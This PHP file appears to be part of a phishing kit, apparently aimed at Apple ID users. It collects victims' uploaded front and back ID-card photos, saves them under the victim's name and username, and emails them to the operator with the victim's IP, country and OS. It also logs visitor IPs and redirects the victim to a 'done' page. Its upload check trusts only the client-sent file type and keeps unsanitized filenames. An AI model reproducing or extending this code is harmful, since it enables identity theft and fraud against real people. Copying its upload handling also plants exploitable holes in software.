<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
$username = $_SESSION['xusername'];
if(isset($_FILES["file"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file']['tmp_name']; 
        $targetPath = "../upload/cc_".$fnames."_".$username."_". $_FILES["file"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $subject = "FRONT ID: $fnames $lnames - $username [ $cn - $os - $ip2 ]";
        $from = "$fnames $lnames";
        kirim_foto($to, $from, $subject, $targetPath);
        $click = fopen("../result/total_upload.txt","a");
        fwrite($click,"$ip2"."\n");
        fclose($click);
        $click = fopen("../result/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengupload Foto ID"."\n");
        fclose($click);
        }
}
else
{
}
if(isset($_FILES["file2"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file2"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file2"]["type"] == "image/png") || ($_FILES["file2"]["type"] == "image/jpg") || ($_FILES["file2"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file2']['tmp_name']; 
        $targetPath = "../upload/cc_".$fnames."_".$username."_". $_FILES["file2"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $subject = "BACK ID: $fnames $lnames - $username [ $cn - $os - $ip2 ]";
        $from = "$fnames $lnames";
        kirim_foto($to, $from, $subject, $targetPath);
        }
}
else
{
}
echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
?>